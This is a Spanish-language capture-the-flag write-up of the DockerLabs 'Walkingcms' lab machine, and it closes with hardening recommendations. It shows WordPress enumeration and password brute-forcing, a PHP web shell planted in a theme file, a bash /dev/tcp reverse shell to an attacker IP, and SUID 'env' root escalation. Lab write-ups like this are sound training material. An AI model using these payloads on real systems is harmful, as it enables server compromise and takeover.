---
title: Walkingcms
excerpt: WritheUp maquina de DockerLabs
publishDate: 'Feb 26 2025'
isFeatured: true
tags:
  - Web
  - Guide
  - CTF
  - Dockerlabs
seo:
  image:
    src: ''
    alt: Wavy lines
---


## **1. Escaneo y Enumeración**:

Escaneo de red:

Comando:

```
nmap -sC -sV -sS -p- -open --min-rate 5000 172.17.0.2 -Pn -n -oN nmap.txt
```

Resultado:

Puerto 80 http



![alt text](<Captura de pantalla 2025-02-25 135055-1.png>)

Enumeración:

Comando enumeracion:

Gobuster: 

```
gobuster dir -u http://172.17.0.2 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x txt,php,html -t 50
```


Resultado:

Directorios --> /wordpress/

Directorios --> /wordpress/wp-wp-content/ 

Directorios --> /wordpress/wp-includes/

Directorios --> /wordpress/wp-admin/



![alt text](<Captura de pantalla 2025-02-25 140519.png>)


![alt text](<Captura de pantalla 2025-02-26 195411.png>)

Encontramos que esta corriendo un wordpress con sus directorios por defecto como 

wp-admin para ingresar vamos a tratar de encontrar usuarios con la herramienta wpscan:

```
wpscan --url http://172.17.0.2/wordpress --enumerate u,vp --random-user-agent --force -o wpscan.txt
```

![alt text](<Captura de pantalla 2025-02-26 200206.png>)

Usuario : Mario

Ahora realizamos un ataque de fuerza bruta con la misma herramienta para encontrar la contraseña del usuario Mario.

```
wpscan --url http://172.17.0.2/wordpress/ --passwords /home/jidu/Desktop/rockyou.txt --usernames mario --random-user-agent --force

```

![alt text](<Captura de pantalla 2025-02-26 200747.png>)

Ingresamos con éxito con las credenciales encontradas

![alt text](<Captura de pantalla 2025-02-26 200916.png>)

Herramientas : nmap - gobuster- wpscan

## **2. Análisis de Vulnerabilidades**

Análisis manual:

En wordpress existen los llamados plugin y temas, estos permiten dar mayores funciones a un wordpress o personalizar su apariencia, pero también los podemos ocupar para realizar algún tipo de ataque , en este caso el tema Twenty Twenty-Two lo podemos editar, además podemos acceder a este archivo en nuestro navegador por la ruta http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php por lo que desde aquí podemos proceder de distintas formas.



Potencial de riesgo en WordPress: Temas y Plugins como vectores de ataque  
En WordPress, los **plugins** y **temas** son componentes fundamentales para agregar funcionalidades y personalizar el diseño. Sin embargo, también representan posibles vectores de ataque si no se gestionan adecuadamente.  

Caso de análisis: Tema Twenty Twenty-Two  
1. **Exposición de archivos críticos**:  
   Al acceder a la ruta `http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php` desde un navegador, se expone la estructura interna del tema. Esto podría facilitar:  
   - **Inyección de código malicioso** si el archivo es modificable.  
   - **Explotación de vulnerabilidades no parcheadas** en el código PHP del tema.  
   - **Reconocimiento de la infraestructura** (ej: versiones de dependencias).  

2. **Riesgos asociados**:  
   - **Edición no autorizada**: Si un atacante obtiene acceso al panel de administración, podría alterar los archivos del tema para ejecutar código arbitrario.  
   - **Exposición de rutas sensibles**: La visibilidad pública de archivos como `index.php` permite estudiar posibles fallos de configuración (ej: directory traversal).  

3. **Vectores de explotación**:  
   - Manipulación de parámetros en URLs para lograr **XSS (Cross-Site Scripting)**.  
   - Uso de funciones PHP no sanitizadas en el tema para **inyección de comandos**.  
   - Ataques **LFI/RFI (Local/Remote File Inclusion)** si el servidor no restringe accesos.  

--- 

![alt text](<Captura de pantalla 2025-02-26 201244.png>)

## **3. Explotación**

Explotar vulnerabilidades:

Editamos el archivo, escribimos el siguiente codigo de tipo web-shell y guardamos el cambio:


     system($_GET['cmd']);


![alt text](<Captura de pantalla 2025-02-26 202628.png>)

Ahora podemos ejecutar comandos de sistemas atreves de la url:



![alt text](<Captura de pantalla 2025-02-26 203000.png>)

Teniendo la posibilidad de ejecutar comando vamos a ejecutar una reverse-shell en el navegador, para esto primero debemos ponernos a la escucha por algún puerto:

```
sudo nc -lvnp 443

```

Despues ingresamos el comando en el navegador *la ip debe ser de la maquina atacante*:

```
# Payload
bash -c "bash -i >%26 /dev/tcp/<IP-ATK>/443 0>%261"

# Comando completo

http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php?cmd=bash -c "bash -i >%26 /dev/tcp/<IP-ATK>/443 0>%261"

```

![alt text](<Captura de pantalla 2025-02-26 203957.png>)


## **4. Post-Explotación**

Escalar privilegios:

Despues de buscar algunas cosas encontramos algo interesante con el siguiente comando:

```
find / -perm -4000 -user root 2>/dev/null
```


El comando `find / -perm -4000 -user root 2>/dev/null` tiene un propósito específico y potencialmente sensible en sistemas Linux/Unix. Aquí su explicación técnica:

---

### **Función del comando**:
Busca **archivos con el bit SUID (Set User ID)** activado, que sean propiedad del usuario **root**, en todo el sistema de archivos (`/`).  
- **SUID**: Permite que un archivo se ejecute con los privilegios del propietario (en este caso, root), incluso si lo ejecuta un usuario sin privilegios.

---

### **Desglose del comando**:
1. **`find /`**:  
   Busca desde el directorio raíz (todo el sistema).
2. **`-perm -4000`**:  
   Filtra archivos con el **bit SUID** activado (representado por el permiso octal `4000`). El guion (`-`) indica que se busque coincidencia exacta de este bit.  
3. **`-user root`**:  
   Solo archivos propiedad del usuario **root**.  
4. **`2>/dev/null`**:  
   Suprime mensajes de error (ej. "Permission denied") para limpiar la salida.

---

![alt text](<Captura de pantalla 2025-02-26 204435.png>)

De los binarios que vemos en la imagen encontramos que el binario *env* puede ser explotado.

GTFOBINS

![alt text](<Captura de pantalla 2025-02-26 205255.png>)

comando:

```
/usr/bin/env /bin/sh -p
```

![alt text](<Captura de pantalla 2025-02-26 205616.png>)


## **5. Informe y Comunicación**  
La principal entrada para este CTF fue la explotación de un sitio WordPress vulnerable debido a:  
- Credenciales débiles (usuario "Mario" comprometido mediante fuerza bruta).  
- Tema editable con permisos inseguros, permitiendo la inyección de una webshell.  
- Binario SUID (`env`) mal configurado para escalada de privilegios.  

---

## **6. Resumen**  

**Hallazgos Principales**  

1. **Escaneo y Enumeración**:  
   - Puerto 80 exponiendo WordPress con directorios predeterminados (`/wp-admin`, `/wp-content`).  
   - Usuario "Mario" identificado mediante enumeración con WPScan.  

2. **Explotación**:  
   - Contraseña del usuario "Mario" obtenida mediante ataque de fuerza bruta (rockyou.txt).  
   - Inyección de webshell en el tema Twenty Twenty-Two para ejecución remota de comandos (RCE).  
   - Reverse Shell exitosa aprovechando código PHP malicioso.  

3. **Post-Explotación**:  
   - Escalada de privilegios mediante el binario `env` con bit SUID activado, permitiendo acceso root.  

4. **Vulnerabilidades Críticas**:  
   - **Autenticación débil**: Contraseña predecible en usuario administrativo.  
   - **Configuración insegura de temas**: Permisos de edición en archivos PHP del tema.  
   - **SUID peligroso**: Binario `env` sin restricciones, facilitando escalada de privilegios.  

---

**Recomendaciones**  

1. **Reforzar la autenticación**:  
   - Implementar políticas de contraseñas robustas (mínimo 12 caracteres, combinación de mayúsculas, números y símbolos).  
   - Habilitar autenticación de dos factores (2FA) para usuarios administrativos.  

2. **Actualizar y endurecer WordPress**:  
   - Eliminar temas/plugins no utilizados.  
   - Restringir permisos de edición en directorios críticos (`wp-content/themes/`).  
   - Aplicar parches de seguridad y actualizar a la última versión de WordPress.  

3. **Monitoreo y hardening del sistema**:  
   - Auditar binarios SUID/SGID periódicamente y eliminar privilegios innecesarios.  
   - Configurar un WAF (Web Application Firewall) para bloquear inyecciones de código.  
   - Limitar el acceso al panel de administración de WordPress por IP o red interna.  

4. **Respuesta ante incidentes**:  
   - Implementar logs detallados de acceso y cambios en archivos del servidor.  
   - Realizar pentests periódicos para identificar vectores de ataque no mitigados.  

 

